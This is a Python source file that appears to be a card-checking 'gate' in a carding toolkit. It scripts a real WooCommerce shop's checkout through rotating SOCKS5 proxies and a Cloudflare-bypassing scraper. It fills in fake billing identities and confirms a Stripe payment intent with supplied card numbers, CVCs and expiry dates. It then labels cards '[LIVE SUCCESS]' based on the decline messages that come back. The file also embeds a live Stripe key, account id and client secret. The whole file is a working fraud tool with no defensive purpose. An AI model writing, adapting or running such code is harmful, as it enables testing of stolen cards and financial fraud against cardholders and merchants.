import cloudscraper
from time import sleep
from urllib.parse import quote
from random import randint
from dependencie.infobill import infobill

from model.models import gateData



from requests_toolbelt.multipart.encoder import MultipartEncoder

class CoreGateCode:
    def __init__(self, cardID):
        self.cardID = cardID
        self.cardIDx2 = ""
        self.billx = infobill()
    def getStr(self,data,inicio,final):
        strx1 = data.split(inicio)
        strx2 = strx1[1].split(final)
        return strx2[0]
    def __valiDCardId(self):
        if self.cardID == 'visa':
            self.cardIDx2 = 'Visa'
        elif self.cardID == 'mc':
            self.cardIDx2 = 'MasterCard'
        elif self.cardID == 'amex':
            self.cardIDx2 = 'AmericanExpress'
        elif self.cardID == 'discovery':
            self.cardIDx2 = 'Discover'
        
    def processCodeGate(self,cc,dataGate:gateData):
        self.__valiDCardId()
        cc1 = cc.ccnum[0:4]
        cc2 = cc.ccnum[4:8]
        cc3 = cc.ccnum[8:12]
        cc4 = cc.ccnum[12:16]


        


        proxies = {
            'http': f'socks5://{dataGate.proxy}',
            'https': f'socks5://{dataGate.proxy}'
        }
        timeout = 5
        
        cs = cloudscraper.create_scraper(
            browser={
                'browser': 'firefox',
                'platform': 'windows',
                'mobile': False
                
            },
            debug=False
            
        )
        

    #datext
        
        #cs.proxies.update(proxies)
        try:
            status = dict()
  

            url="https://birdiesroom.com/product/sling-rings/"
            headers={
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "DNT":"1",
            "Connection":"keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"none",
            'Sec-Fetch-User':'?1'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)



            mp_encoder = MultipartEncoder(
                {
                    "attribute_pa_alpaca-colour":"sling-rings-black",
                    "attribute_pa_ring-size":"small-5-cm-25",
                    "quantity":"1",
                    "add-to-cart":"33714",
                    "product_id":"33714",
                    "variation_id":"65483"

                }
            )





            headers = {
            'Host':'birdiesroom.com',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language':'en-US,en;q=0.5',
            'Accept-Encoding':'gzip, deflate, br',
            'Origin':'https://birdiesroom.com',
            'Content-Type': mp_encoder.content_type,
            'DNT':'1',
            'Connection':'keep-alive',
            'Referer':'https://birdiesroom.com/product/sling-rings/',
            'Upgrade-Insecure-Requests':'1',
            'Sec-Fetch-Dest':'document',
            'Sec-Fetch-Mode':'navigate',
            'Sec-Fetch-Site':'same-origin',
            'Sec-Fetch-User':'?1',
            'TE':'trailers'
            }

            data = "attribute_pa_alpaca-colour=sling-rings-orange&attribute_pa_ring-size=small-5-cm-25&quantity=1&add-to-cart=33714&product_id=33714&variation_id=65493"
            datac = cs.post("https://birdiesroom.com/product/sling-rings/",data=mp_encoder,headers=headers,proxies=proxies,timeout=timeout)


            headers = {
            'authority':'birdiesroom.com',
            'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language':'es-US,es-419;q=0.9,es;q=0.8,und;q=0.7,en;q=0.6',
            'dnt':'1',
            'referer':'https://birdiesroom.com/cart/',
            'upgrade-insecure-requests':'1',

            }

            datac = cs.get("https://birdiesroom.com/checkout/",headers=headers,proxies=proxies,timeout=timeout)



            checkSecurity = self.getStr(datac.text,'woocommerce-process-checkout-nonce" value="','"')



            getcarD = self.getStr(datac.text,'get_cart_details":"','"')



            paymentCre = self.getStr(datac.text,'createPaymentIntentNonce":"','"')


            updateorder = self.getStr(datac.text,'update_order_review_nonce":"','"')
            api='pi_3KoP8I2HnAbQfyqr0RYCVOd3'


            url="https://birdiesroom.com/?wc-ajax=wcpay_get_cart_details"
            headers={
            "Accept":"*/*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "Origin":"https://birdiesroom.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://birdiesroom.com/checkout/",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            data='security='+getcarD
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)


            url="https://birdiesroom.com/?wc-ajax=wcpay_create_payment_intent"
            headers={
            "Accept":"*/*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "Origin":"https://birdiesroom.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://birdiesroom.com/checkout/",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            data='_ajax_nonce='+paymentCre
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)
            email = self.billx.emailx.lower()

            emailx = email+"@hotmail.com"



            url="https://birdiesroom.com/wp-admin/admin-ajax.php"
            headers={
            "Accept":"*/*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "Origin":"https://birdiesroom.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://birdiesroom.com/checkout/",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            data='action=cartbounty_pro_save&cartbounty_pro_email='+emailx+'&cartbounty_pro_name='+self.billx.nameFirs+'&cartbounty_pro_surname='+self.billx.nameLast+'&cartbounty_pro_phone='+self.billx.phone1+'&cartbounty_pro_country=US&cartbounty_pro_city='+self.billx.city+'&cartbounty_pro_billing_company=&cartbounty_pro_billing_address_1='+self.billx.address+'&cartbounty_pro_billing_address_2=&cartbounty_pro_billing_state='+self.billx.estado2+'&cartbounty_pro_billing_postcode='+self.billx.zipcode+'&cartbounty_pro_shipping_first_name='+self.billx.nameFirs+'&cartbounty_pro_shipping_last_name='+self.billx.nameLast+'&cartbounty_pro_shipping_company=&cartbounty_pro_shipping_country=US&cartbounty_pro_shipping_address_1='+self.billx.address+'&cartbounty_pro_shipping_address_2=&cartbounty_pro_shipping_city=&cartbounty_pro_shipping_state=&cartbounty_pro_shipping_postcode=&cartbounty_pro_order_comments=&cartbounty_pro_create_account=0&cartbounty_pro_ship_elsewhere=0&cartbounty_pro_phone_consent=0&cartbounty_pro_language=en_US'
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)



            url="https://birdiesroom.com/?wc-ajax=checkout"
            headers={

            "Accept":"*/*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":"XMLHttpRequest",
            "Origin":"https://birdiesroom.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://birdiesroom.com/checkout/",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            'Sec-Fetch-Site':'same-origin'
            }
            data='billing_email='+emailx+'&billing_first_name='+self.billx.nameFirs+'&billing_last_name='+self.billx.nameLast+'&billing_company=&billing_country=US&billing_address_1='+self.billx.address+'&billing_address_2=&billing_city='+self.billx.city+'&billing_state='+self.billx.estado2+'&billing_postcode='+self.billx.zipcode+'&billing_phone='+self.billx.phone1+'&account_username='+self.billx.nameFirs+str(randint(1,219094))+'&account_password=L'+self.billx.nameFirs+'gfsggsdfgdfg&billing_birth_date=197'+str(randint(1,9))+'-0'+str(randint(1,9))+'-0'+str(randint(1,9))+'&shipping_first_name='+self.billx.nameFirs+'&shipping_last_name='+self.billx.nameLast+'&shipping_company=&shipping_country=US&shipping_address_1='+self.billx.address+'&shipping_address_2=&shipping_city=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flexible_shipping_20_13&payment_method=woocommerce_payments&wcpay-payment-method-upe=&wcpay_selected_upe_payment_type=card&wcpay_payment_country=US&mailpoet_woocommerce_checkout_optin_present=1&terms=on&terms-field=1&woocommerce-process-checkout-nonce='+checkSecurity+'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc_payment_intent_id='+api
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)



            lsk='pk_live_iBIpeqzKOOx2Y8PFCRBfyMU000Q7xVG4Sn'
            client_secret='pi_3KoP8I2HnAbQfyqr0RYCVOd3_secret_vGfwVLhkSlboFBRQL5aDEYQn3'
            acc_stripe='acct_1KNPEY2HnAbQfyqr'



            url="https://api.stripe.com/v1/payment_intents/"+api+"/confirm"
            headers={
            "Accept":"application/json",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded",
            "Origin":"https://js.stripe.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://js.stripe.com/",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-site",
            'TE':'trailers'
            }
            data='return_url=https%3A%2F%2Fbirdiesroom.com%2Fcheckout%2Forder-received%2F92550%2F%3Fkey%3Dwc_order_dughsTSOF2V5G%26alg_wc_ev_activate_account_message%3D13171%26order_id%3D92550%26wc_payment_method%3Dwoocommerce_payments%26_wpnonce%3D5975b1cc37%26save_payment_method%3Dno&payment_method_data[billing_details][name]='+self.billx.nameFirs+'+'+self.billx.nameLast+'&payment_method_data[billing_details][email]='+emailx+'&payment_method_data[billing_details][phone]='+self.billx.phone1+'&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]='+self.billx.address+'&payment_method_data[billing_details][address][line2]=-&payment_method_data[billing_details][address][city]='+self.billx.city+'&payment_method_data[billing_details][address][state]='+self.billx.estado2+'&payment_method_data[billing_details][address][postal_code]='+self.billx.zipcode+'&payment_method_data[type]=card&payment_method_data[card][number]='+cc1+'+'+cc2+'+'+cc3+'+'+cc4+'&payment_method_data[card][cvc]='+cc.cv2+'&payment_method_data[card][exp_year]='+cc.expy+'&payment_method_data[card][exp_month]='+cc.expm+'&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F52a8deb59%3B+stripe-js-v3%2F52a8deb59%3B+payment-element&payment_method_data[time_on_page]=993223&payment_method_data[guid]=8b1f9e92-b159-497f-9b46-555f08dd07f591f6fe&payment_method_data[muid]=941b1892-039e-4b51-9493-1c0cf75cbc98b62e7d&payment_method_data[sid]=311dc0c3-294b-4219-a8dd-4275cde7ae1a040f5d&expected_payment_method_type=card&use_stripe_sdk=true&key='+lsk+'&_stripe_account='+acc_stripe+'&client_secret='+client_secret
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)




            cs.close()
                # 'ccResponse':dataGate.cc+ " ["++"]",

            if 'Your card was declined.' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc,   'proxy':dataGate.proxy,'datext':None}
            elif 'DECLINED' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc,   'proxy':dataGate.proxy,'datext':None}
            elif 'Your card does not support this type of purchase.' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc,   'proxy':dataGate.proxy,'datext':None}
            elif 'Your card number is incorrect.' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc,   'proxy':dataGate.proxy,'datext':None}
            elif "Your card's security code is incorrect." in datac.text:
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+" [LIVE SUCCESS]",'proxy':dataGate.proxy,'datext':None}
            elif "200" in datac.text:
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+" [LIVE SUCCESS]",'proxy':dataGate.proxy,'datext':None}

            else:
                status = {'msg':3,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy,'datext':None}
                
            return status
        except Exception as e:
            print(e,'que paso')
            return {'msg':4,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy}